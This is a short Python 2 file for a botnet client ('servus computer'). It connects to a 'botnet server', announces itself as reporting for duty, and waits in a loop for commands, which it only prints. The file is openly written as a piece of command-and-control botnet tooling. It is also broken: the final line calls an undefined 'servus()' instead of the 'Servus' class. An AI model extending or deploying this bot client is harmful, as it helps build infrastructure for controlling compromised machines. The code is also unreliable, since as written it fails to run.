# Description: servus Computer


import socket

class Servus(object):
 ''' The servus computer '''

 def __init__(self,ip=None,port=None,msg=None):
  self.serverIp = ip if ip else '127.0.0.1'
  self.serverPort = port if port else 12345
  self.msg = msg if msg else 'servus computer reporting for duty'
  self.servus = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  try:
   self.servus.connect((self.serverIp, self.serverPort))
  except:
   exit('Failed to contact botnet server')

 def exit(self):
  try:
   self.servus.shutdown(socket.SHUT_RDWR)
   self.servus.close()
  finally:
   exit()

 def run(self):
  self.servus.sendall(self.msg) # report for duty

  while 1:
   try:
    self.servus.sendall(' ') # see if we are connected
    self.servus.settimeout(0.1)
    cmd = self.servus.recv(1024) # wait for commands

    if not cmd:continue
    print '[-] Command: {}\n'.format(cmd)

    if cmd == 'Server Offline':break
   except socket.timeout:pass
   except:self.exit()

servus().run()